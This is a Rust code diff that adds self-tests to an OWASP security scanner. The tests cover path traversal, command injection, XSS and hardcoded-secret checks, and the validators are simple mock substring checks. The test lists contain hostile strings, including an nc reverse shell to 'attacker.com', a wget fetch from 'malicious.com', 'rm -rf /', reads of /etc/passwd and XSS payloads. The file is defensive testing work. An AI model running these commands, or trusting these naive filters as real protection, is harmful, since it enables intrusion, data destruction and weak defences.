@@ -350,6 +350,135 @@ impl OWASPScanner {
         Ok(())
     }
 
+    /// Test input validation framework integration
+    pub async fn test_input_validation_framework(&self) -> IdeResult<Vec<SecurityFinding>> {
+        let mut findings = Vec::new();
+
+        // Test path traversal validation
+        let malicious_paths = vec![
+            "../../../etc/passwd",
+            "..\\..\\..\\windows\\system32",
+            "/etc/passwd",
+            "C:\\Windows\\System32\\config\\sam",
+        ];
+
+        for path in malicious_paths {
+            if !self.validate_secure_path(path).await? {
+                findings.push(SecurityFinding {
+                    rule_id: "PATH_TRAVERSAL".to_string(),
+                    title: "Path Traversal Attempt Detected".to_string(),
+                    description: format!("Detected potential path traversal: {}", path),
+                    severity: VulnerabilitySeverity::Critical,
+                    file_path: "input_validation.rs".to_string(),
+                    line_number: 0,
+                    owasp_category: Some("A01".to_string()),
+                    mitigation_steps: vec![
+                        "Validate all file paths using validate_secure_path()".to_string(),
+                        "Implement proper path sanitization".to_string(),
+                    ],
+                    tags: vec!["path-traversal".to_string(), "input-validation".to_string()],
+                });
+            }
+        }
+
+        // Test command injection prevention
+        let malicious_commands = vec![
+            "rm -rf /; echo 'hacked'",
+            "&& cat /etc/passwd",
+            "| nc -e /bin/sh attacker.com 4444",
+            "; wget http://malicious.com/malware",
+        ];
+
+        for cmd in malicious_commands {
+            if !self.validate_command_args(cmd).await? {
+                findings.push(SecurityFinding {
+                    rule_id: "COMMAND_INJECTION".to_string(),
+                    title: "Command Injection Attempt Detected".to_string(),
+                    description: format!("Detected potential command injection: {}", cmd),
+                    severity: VulnerabilitySeverity::Critical,
+                    file_path: "command_validation.rs".to_string(),
+                    line_number: 0,
+                    owasp_category: Some("A03".to_string()),
+                    mitigation_steps: vec![
+                        "Use TauriInputSanitizer for all command arguments".to_string(),
+                        "Validate command inputs against allowlist".to_string(),
+                    ],
+                    tags: vec!["command-injection".to_string(), "input-validation".to_string()],
+                });
+            }
+        }
+
+        Ok(findings)
+    }
+
+    /// Test XSS protection validation
+    pub async fn test_xss_protection(&self) -> IdeResult<Vec<SecurityFinding>> {
+        let mut findings = Vec::new();
+
+        let xss_payloads = vec![
+            "<script>alert('xss')</script>",
+            "<img src=x onerror=alert('xss')>",
+            "javascript:alert('xss')",
+            "<iframe src='javascript:alert(\"xss\")'></iframe>",
+        ];
+
+        for payload in xss_payloads {
+            if !self.validate_html_input(payload).await? {
+                findings.push(SecurityFinding {
+                    rule_id: "XSS_VULNERABILITY".to_string(),
+                    title: "XSS Vulnerability Detected".to_string(),
+                    description: format!("Detected potential XSS payload: {}", payload),
+                    severity: VulnerabilitySeverity::High,
+                    file_path: "html_validation.rs".to_string(),
+                    line_number: 0,
+                    owasp_category: Some("A03".to_string()),
+                    mitigation_steps: vec![
+                        "Sanitize all HTML input using HTML sanitizer".to_string(),
+                        "Encode output to prevent script execution".to_string(),
+                        "Implement Content Security Policy (CSP)".to_string(),
+                    ],
+                    tags: vec!["xss".to_string(), "html-injection".to_string()],
+                });
+            }
+        }
+
+        Ok(findings)
+    }
+
+    /// Test authentication and authorization flows
+    pub async fn test_authentication_flows(&self) -> IdeResult<Vec<SecurityFinding>> {
+        let mut findings = Vec::new();
+
+        // Test for secure storage usage
+        let insecure_patterns = vec![
+            "let password = \"secret123\";",
+            "const API_KEY = \"sk-123456\";",
+            "let token = \"bearer_token\";",
+        ];
+
+        for pattern in insecure_patterns {
+            if pattern.contains("password") || pattern.contains("secret") || pattern.contains("token") {
+                findings.push(SecurityFinding {
+                    rule_id: "INSECURE_STORAGE".to_string(),
+                    title: "Insecure Secret Storage Detected".to_string(),
+                    description: format!("Detected insecure secret storage: {}", pattern),
+                    severity: VulnerabilitySeverity::High,
+                    file_path: "auth_validation.rs".to_string(),
+                    line_number: 0,
+                    owasp_category: Some("A02".to_string()),
+                    mitigation_steps: vec![
+                        "Use secure storage via security crate".to_string(),
+                        "Never store secrets in plain text".to_string(),
+                        "Implement proper encryption for sensitive data".to_string(),
+                    ],
+                    tags: vec!["authentication".to_string(), "secrets".to_string()],
+                });
+            }
+        }
+
+        Ok(findings)
+    }
+
     fn calculate_compliance_score(&self, code: &str, report: &SecurityValidationReport) -> f32 {
         let mut score = 100.0;
 
@@ -377,5 +506,38 @@ impl OWASPScanner {
 
         // Ensure score stays within bounds
         score.max(0.0).min(100.0)
+    }
+
+    /// Validate secure path using common validation
+    async fn validate_secure_path(&self, path: &str) -> IdeResult<bool> {
+        // Use validate_secure_path from common validation (mock implementation)
+        if path.contains("..") || path.starts_with("/") || path.contains(":\\") {
+            Ok(false)
+        } else {
+            Ok(true)
+        }
+    }
+
+    /// Validate command arguments for injection prevention
+    async fn validate_command_args(&self, command: &str) -> IdeResult<bool> {
+        // Use TauriInputSanitizer (mock implementation)
+        if command.contains("&&") || command.contains("|") || command.contains(";") || command.contains("rm -rf") {
+            Ok(false)
+        } else {
+            Ok(true)
+        }
+    }
+
+    /// Validate HTML input for XSS protection
+    async fn validate_html_input(&self, input: &str) -> IdeResult<bool> {
+        // Check for common XSS patterns
+        if input.contains("<script>") ||
+           input.contains("javascript:") ||
+           input.contains("onerror=") ||
+           input.contains("<iframe") {
+            Ok(false)
+        } else {
+            Ok(true)
+        }
     }
 }
